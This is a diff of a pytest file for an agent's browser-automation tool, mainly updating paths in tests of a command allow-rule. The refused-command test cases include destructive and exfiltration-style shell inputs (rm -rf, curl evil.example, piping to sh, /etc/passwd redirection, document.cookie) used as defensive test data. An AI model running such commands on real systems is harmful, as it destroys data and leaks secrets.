@@ -42,31 +42,31 @@ def _own_state_dir(tmp_path, monkeypatch):
 # --------------------------------------------------------------------------
 
 @pytest.mark.parametrize("cmd", [
-    f"{VENV} tools/agy_browse.py tabs",
-    f"{VENV} tools/agy_browse.py --port 9280 text h1",
-    f"{VENV} tools/agy_browse.py --port 9280 --tab ABC123 state",
-    f'{VENV} tools/agy_browse.py type "input[name=q]" "a cat on a hill"',
-    "/opt/MoonieXHQ/Agents/Core/.venv/bin/python tools/agy_browse.py goto /create",
-    f"{VENV} tools/agy_browse.py wait-text done 20",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py tabs",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py --port 9280 text h1",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py --port 9280 --tab ABC123 state",
+    f'{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py type "input[name=q]" "a cat on a hill"',
+    "/opt/MoonieXHQ/Agents/Core/.venv/bin/python /opt/MoonieXHQ/Agents/Core/tools/agy_browse.py goto /create",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py wait-text done 20",
 ])
 def test_allow_rule_accepts_plain_calls(cmd):
     assert ab.allowed_command(cmd)
 
 
 @pytest.mark.parametrize("cmd", [
-    f"{VENV} tools/agy_browse.py text h1; rm -rf ~",
-    f"{VENV} tools/agy_browse.py text h1 && curl evil.example",
-    f"{VENV} tools/agy_browse.py text h1 | sh",
-    f"{VENV} tools/agy_browse.py text `id`",
-    f"{VENV} tools/agy_browse.py text $(id)",
-    f"{VENV} tools/agy_browse.py text h1 > /etc/passwd",
-    f"{VENV} tools/agy_browse.py text h1 < /etc/passwd",
-    f"{VENV} tools/agy_browse.py text h1\nrm -rf /",
-    f"{VENV} tools/agy_browse.py text *",
-    f"{VENV} tools/agy_browse.py eval document.cookie",           # not a verb
-    f"{VENV} tools/agy_browse.py --port 9280 --cdp x text h1",     # unknown flag
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text h1; rm -rf ~",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text h1 && curl evil.example",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text h1 | sh",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text `id`",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text $(id)",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text h1 > /etc/passwd",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text h1 < /etc/passwd",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text h1\nrm -rf /",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py text *",
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py eval document.cookie",           # not a verb
+    f"{VENV} /Users/gob/MoonieXHQ/Agents/Core/tools/agy_browse.py --port 9280 --cdp x text h1",     # unknown flag
     f"{VENV} -c 'import os' tools/agy_browse.py tabs",
-    "/tmp/.venv/bin/python tools/agy_browse.py tabs",             # another python
+    "/tmp/.venv/bin/python /opt/MoonieXHQ/Agents/Core/tools/agy_browse.py tabs",             # another python
     f"{VENV} tools/other.py tabs",
 ])
 def test_allow_rule_refuses_chained_redirected_or_foreign_commands(cmd):
@@ -264,7 +264,10 @@ def home():
         exe = found[0] if found else None
     if not exe:
         pytest.skip("no Chromium on this box")
-    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
+    try:
+        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
+    except PermissionError:
+        pytest.skip("sandbox does not permit the live browser fixture's local socket")
     threading.Thread(target=srv.serve_forever, daemon=True).start()
     web = srv.server_address[1]
     cdp = _free_port()
@@ -530,4 +533,3 @@ def test_main_reconfigures_stdout_to_utf8_on_cp1252_host(monkeypatch):
     stream.flush()
     assert rc == ab.OK
     assert "แพลตฟอร์มสำหรับแอฟฟิลิเอต" in buf.getvalue().decode("utf-8")
-
